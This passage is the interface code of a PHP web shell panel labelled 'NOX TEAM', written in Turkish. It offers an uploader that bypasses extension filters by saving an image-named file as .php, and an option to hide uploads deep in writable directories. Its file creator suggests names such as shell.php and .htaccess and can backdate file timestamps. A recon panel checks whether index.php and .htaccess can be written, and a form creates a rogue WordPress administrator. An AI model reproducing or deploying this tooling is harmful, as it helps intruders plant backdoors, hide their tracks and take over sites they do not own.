        <label class="hide-check" style="margin-top:8px;opacity:.35;pointer-events:none;" id="deepHideDirLabel">
          <input type="checkbox" name="deep_hide_dir" value="1" id="deepHideDirCheck" disabled>
          <span class="check-box" style="border-color:#00aaff;"></span>
          DEEP HIDE IN DIR <span style="color:var(--gray);font-size:.75rem;">— seçili dizinin derinlerine göm</span>
        </label>

        <!-- Uzantı Bypass -->
        <div style="margin-top:14px;">
          <div style="font-size:.72rem;color:var(--gray);margin-bottom:6px;letter-spacing:1px;">
            UZANTI BYPASS <span style="color:var(--gray);font-weight:normal;font-size:.68rem;">— boş bırakırsan orijinal uzantı korunur</span>
          </div>
          <div style="display:flex;align-items:center;gap:8px;">
            <div style="background:#020a04;border:1px solid var(--red);border-radius:3px;padding:4px 10px;color:var(--gray);font-size:.78rem;white-space:nowrap;">
              dosyaadı.
            </div>
            <input type="text" name="force_ext" placeholder="php / phtml / php7 / shtml"
              style="flex:1;background:#020a04;border:1px solid var(--red);border-radius:3px;
                     color:var(--red);font-family:'Share Tech Mono',monospace;font-size:.78rem;
                     padding:7px 10px;outline:none;"
              onfocus="this.style.borderColor='#ff6677'" onblur="this.style.borderColor='var(--red)'">
          </div>
          <div style="font-size:.68rem;color:var(--gray);margin-top:5px;">
            Kullanım: dosyayı <span style="color:var(--red);">functions.jpg</span> olarak yükle → buraya <span style="color:var(--red);">php</span> yaz → sunucuda <span style="color:var(--red);">functions.php</span> olarak kaydedilir
          </div>
        </div>

        <!-- Dizin Seçici -->
        <div style="margin-top:14px;">
          <div style="font-size:.72rem;color:var(--gray);margin-bottom:6px;letter-spacing:1px;">
            HEDEF DİZİN
          </div>
          <select name="custom_dir" id="customDir"
            style="width:100%;background:#020a04;border:1px solid var(--green2);border-radius:3px;
                   color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.78rem;
                   padding:8px 10px;outline:none;cursor:pointer;appearance:none;
                   background-image:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%2212%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%2300cc66%22 stroke-width=%222%22><path d=%22M6 9l6 6 6-6%22/></svg>');
                   background-repeat:no-repeat;background-position:right 10px center;">
            <option value="__default__">[ VARSAYILAN — upload.php dizini ]</option>
            <option value="<?= htmlspecialchars($docRootScan) ?>">/ — Ana Dizin (<?= htmlspecialchars($docRootScan) ?>)</option>
            <?php foreach ($writableDirs as $d):
              $label = str_replace($docRootScan, '', $d) ?: '/';
            ?>
            <option value="<?= htmlspecialchars($d) ?>"><?= htmlspecialchars($label) ?></option>
            <?php endforeach; ?>
          </select>
        </div>
        <div style="margin-top:22px; text-align:center;">
          <button type="submit" class="btn" style="margin-top:0;">
            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
            UPLOAD
          </button>
        </div>
      </form>
    </div>
  </div>

  <!-- ── MESAJ (CREATE) ── -->
  <?php if ($createMsg): ?>
  <div class="message <?= $createType ?>"
    <?php if ($createType === 'error'): ?>style="background:#ff335510;color:var(--red);border-color:var(--red);"<?php endif; ?>>
    <?= htmlspecialchars($createMsg) ?>
    <?php if ($createType === 'success' && $createLink): ?>
    <br>
    <a class="file-link" href="<?= htmlspecialchars($createLink) ?>" target="_blank">
      <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>
      <?= htmlspecialchars($createLink) ?>
    </a>
    <?php endif; ?>
  </div>
  <?php endif; ?>

  <!-- ── DOSYA OLUŞTURUCU ── -->
  <div class="panel" style="border-color:#00aaff33;">
    <div class="panel-header" style="border-color:#00aaff22;">
      <div class="dot" style="background:#00aaff;box-shadow:0 0 6px #00aaff;"></div>
      <span style="color:#00aaff;">FILE_CREATOR</span>
    </div>
    <div class="panel-body">
      <form method="POST">
        <input type="hidden" name="action" value="create_file">

        <!-- Dosya Adı -->
        <div style="margin-bottom:12px;">
          <div style="font-size:.72rem;color:var(--gray);margin-bottom:5px;letter-spacing:1px;">DOSYA ADI</div>
          <input type="text" name="cf_name" placeholder="shell.php / config.json / .htaccess"
            style="width:100%;background:#020a04;border:1px solid #00aaff44;border-radius:3px;
                   color:#66ccff;font-family:'Share Tech Mono',monospace;font-size:.82rem;
                   padding:8px 10px;outline:none;"
            onfocus="this.style.borderColor='#00aaff'" onblur="this.style.borderColor='#00aaff44'">
        </div>

        <!-- İçerik -->
        <div style="margin-bottom:12px;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
            <span style="font-size:.72rem;color:var(--gray);letter-spacing:1px;">İÇERİK</span>
            <span id="cfCharCount" style="font-size:.68rem;color:var(--gray);">0 karakter</span>
          </div>
          <textarea name="cf_content" id="cfContent" rows="10" placeholder="<?php echo htmlspecialchars('<?php echo "merhaba dünya"; ?>'); ?>"
            style="width:100%;background:#020a04;border:1px solid #00aaff44;border-radius:3px;
                   color:#aaddff;font-family:'Share Tech Mono',monospace;font-size:.8rem;
                   padding:10px;outline:none;resize:vertical;line-height:1.5;"
            onfocus="this.style.borderColor='#00aaff'" onblur="this.style.borderColor='#00aaff44'"></textarea>
        </div>

        <!-- Hedef Dizin -->
        <div style="margin-bottom:12px;">
          <div style="font-size:.72rem;color:var(--gray);margin-bottom:5px;letter-spacing:1px;">HEDEF DİZİN</div>
          <select name="cf_dir"
            style="width:100%;background:#020a04;border:1px solid #00aaff44;border-radius:3px;
                   color:#66ccff;font-family:'Share Tech Mono',monospace;font-size:.78rem;
                   padding:8px 10px;outline:none;cursor:pointer;appearance:none;
                   background-image:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%2212%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%2300aaff%22 stroke-width=%222%22><path d=%22M6 9l6 6 6-6%22/></svg>');
                   background-repeat:no-repeat;background-position:right 10px center;">
            <option value="__default__">[ VARSAYILAN — upl.php dizini ]</option>
            <option value="<?= htmlspecialchars($docRootScan) ?>">/ — Ana Dizin (<?= htmlspecialchars($docRootScan) ?>)</option>
            <?php foreach ($writableDirs as $d):
              $label = str_replace($docRootScan, '', $d) ?: '/';
            ?>
            <option value="<?= htmlspecialchars($d) ?>"><?= htmlspecialchars($label) ?></option>
            <?php endforeach; ?>
          </select>
        </div>

        <!-- Spoof Date -->
        <label class="hide-check" style="margin-top:4px;">
          <input type="checkbox" name="cf_fake_date" value="1">
          <span class="check-box"></span>
          SPOOF DATE <span style="color:var(--gray);font-size:.75rem;">— oluşturma tarihini geçmişe çek</span>
        </label>

        <div style="text-align:center;margin-top:20px;">
          <button type="submit" class="btn" style="margin-top:0;border-color:#00aaff;color:#00aaff;"
            onmouseover="this.style.background='#00aaff';this.style.color='var(--bg)'"
            onmouseout="this.style.background='transparent';this.style.color='#00aaff'">
            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
              <path d="M12 5v14M5 12l7-7 7 7"/></svg>
            CREATE FILE
          </button>
        </div>
      </form>
    </div>
  </div>

  <!-- ── RECON ── -->
  <?php
  $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
  $reconTargets = ['index.php', '.htaccess'];
  $reconResults = [];
  foreach ($reconTargets as $t) {
      $full = $docRoot . DIRECTORY_SEPARATOR . $t;
      $exists   = file_exists($full);
      $writable = $exists ? is_writable($full) : is_writable($docRoot);
      $reconResults[$t] = ['exists' => $exists, 'writable' => $writable];
  }
  ?>
  <div class="panel">
    <div class="panel-header">
      <div class="dot" style="background:#ffaa00;box-shadow:0 0 6px #ffaa00;"></div>
      RECON &nbsp;<span style="color:var(--gray);font-size:.65rem;">// <?= htmlspecialchars($docRoot) ?></span>
    </div>
    <div class="panel-body" style="padding:14px 20px;">
      <div style="display:flex;flex-direction:column;gap:8px;">
        <?php foreach ($reconResults as $name => $info): ?>
        <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 12px;border:1px solid var(--border);border-radius:3px;font-size:.8rem;">
          <span style="color:var(--green);"><?= htmlspecialchars($name) ?></span>
          <div style="display:flex;gap:8px;">
            <span style="padding:2px 10px;border-radius:2px;font-size:.7rem;
              background:<?= $info['exists'] ? '#00ff8818' : '#ff335518' ?>;
              color:<?= $info['exists'] ? 'var(--green)' : 'var(--red)' ?>;
              border:1px solid <?= $info['exists'] ? 'var(--green2)' : 'var(--red)' ?>;">
              <?= $info['exists'] ? 'MEVCUT' : 'YOK' ?>
            </span>
            <span style="padding:2px 10px;border-radius:2px;font-size:.7rem;
              background:<?= $info['writable'] ? '#00ff8818' : '#ff335518' ?>;
              color:<?= $info['writable'] ? 'var(--green)' : 'var(--red)' ?>;
              border:1px solid <?= $info['writable'] ? 'var(--green2)' : 'var(--red)' ?>;">
              <?= $info['writable'] ? 'YAZILABİLİR' : 'YAZMA YOK' ?>
            </span>
          </div>
        </div>
        <?php endforeach; ?>
      </div>
    </div>
  </div>


  <!-- ── WP ADMIN OLUŞTURUCU ── -->
  <div class="panel" style="border-color:#aa44ff33;">
    <div class="panel-header" style="border-color:#aa44ff22;">
      <div class="dot" style="background:#aa44ff;box-shadow:0 0 6px #aa44ff;"></div>
      <span style="color:#aa44ff;">WP_ADMIN_CREATOR</span>
    </div>
    <div class="panel-body">
      <?php if ($wpMsg): ?>
      <div class="message <?= $wpType ?>" style="margin-bottom:16px;
        <?= $wpType==='error' ? 'background:#ff335510;color:var(--red);border-color:var(--red);' : '' ?>">
        <?= htmlspecialchars($wpMsg) ?>
      </div>
      <?php endif; ?>

      <form method="POST">
        <input type="hidden" name="action" value="wp_create_admin">
        <div style="display:flex;flex-direction:column;gap:10px;">

          <div>
            <div style="font-size:.7rem;color:var(--gray);margin-bottom:4px;">KULLANICI ADI</div>
            <input type="text" name="wp_user" placeholder="admin2"
              style="width:100%;background:#020a04;border:1px solid #aa44ff44;border-radius:3px;
                     color:#cc88ff;font-family:'Share Tech Mono',monospace;font-size:.82rem;
                     padding:8px 10px;outline:none;"
              onfocus="this.style.borderColor='#aa44ff'" onblur="this.style.borderColor='#aa44ff44'">
          </div>

          <div>
            <div style="font-size:.7rem;color:var(--gray);margin-bottom:4px;">ŞİFRE</div>
            <input type="text" name="wp_pass" placeholder="güçlü bir şifre"
              style="width:100%;background:#020a04;border:1px solid #aa44ff44;border-radius:3px;
                     color:#cc88ff;font-family:'Share Tech Mono',monospace;font-size:.82rem;
                     padding:8px 10px;outline:none;"
              onfocus="this.style.borderColor='#aa44ff'" onblur="this.style.borderColor='#aa44ff44'">
          </div>

          <div>
            <div style="font-size:.7rem;color:var(--gray);margin-bottom:4px;">E-POSTA</div>
            <input type="email" name="wp_email" placeholder="admin@site.com"
              style="width:100%;background:#020a04;border:1px solid #aa44ff44;border-radius:3px;
                     color:#cc88ff;font-family:'Share Tech Mono',monospace;font-size:.82rem;
                     padding:8px 10px;outline:none;"
              onfocus="this.style.borderColor='#aa44ff'" onblur="this.style.borderColor='#aa44ff44'">
          </div>

        </div>
        <div style="text-align:center;margin-top:20px;">
          <button type="submit" class="btn" style="margin-top:0;border-color:#aa44ff;color:#aa44ff;"
            onmouseover="this.style.background='#aa44ff';this.style.color='var(--bg)'"
            onmouseout="this.style.background='transparent';this.style.color='#aa44ff'">
            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
              <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2M12 11a4 4 0 100-8 4 4 0 000 8z"/>
            </svg>
            CREATE ADMIN
          </button>
        </div>
      </form>
    </div>
  </div>

<?php endif; ?>

  <div class="footer">
    &copy; <span>NOX TEAM</span> &mdash; ALL RIGHTS RESERVED
  </div>

</div>

<script>
<?php if (!$authenticated): ?>
// Yanlış şifrede titreme animasyonu
document.getElementById('loginForm').addEventListener('submit', function() {
  // submit sonrası sunucu cevabını bekle, hata varsa PHP zaten geri döner
});
<?php if ($loginError): ?>
const row = document.getElementById('inputRow');
row.classList.add('shake');
<?php endif; ?>

<?php else: ?>
const dropArea = document.getElementById('dropArea');
const fileInput = document.getElementById('fileInput');
const selectedName = document.getElementById('selected-name');

fileInput.addEventListener('change', () => {
  if (fileInput.files[0]) selectedName.textContent = fileInput.files[0].name;
});

['dragenter','dragover'].forEach(e => dropArea.addEventListener(e, ev => { ev.preventDefault(); dropArea.classList.add('dragover'); }));
['dragleave','drop'].forEach(e => dropArea.addEventListener(e, ev => { ev.preventDefault(); dropArea.classList.remove('dragover'); }));

dropArea.addEventListener('drop', ev => {
  const dt = ev.dataTransfer;
  if (dt.files.length) {
    fileInput.files = dt.files;
    selectedName.textContent = dt.files[0].name;
  }
});

// FILE CREATOR — karakter sayacı
const cfContent = document.getElementById('cfContent');
const cfCharCount = document.getElementById('cfCharCount');
if (cfContent && cfCharCount) {
  cfContent.addEventListener('input', () => {
    cfCharCount.textContent = cfContent.value.length.toLocaleString() + ' karakter';
  });
}

// DEEP HIDE IN DIR — dizin seçince aktif et, seçilmeyince soluk/disabled
const customDir    = document.getElementById('customDir');
const deepLabel    = document.getElementById('deepHideDirLabel');
const deepCheck    = document.getElementById('deepHideDirCheck');
customDir.addEventListener('change', function() {
  const hasDir = this.value !== '__default__';
  deepLabel.style.opacity       = hasDir ? '1'    : '.35';
  deepLabel.style.pointerEvents = hasDir ? 'auto' : 'none';
  deepCheck.disabled            = !hasDir;
  if (!hasDir) deepCheck.checked = false;
});
<?php endif; ?>
</script>
</body>
</html>
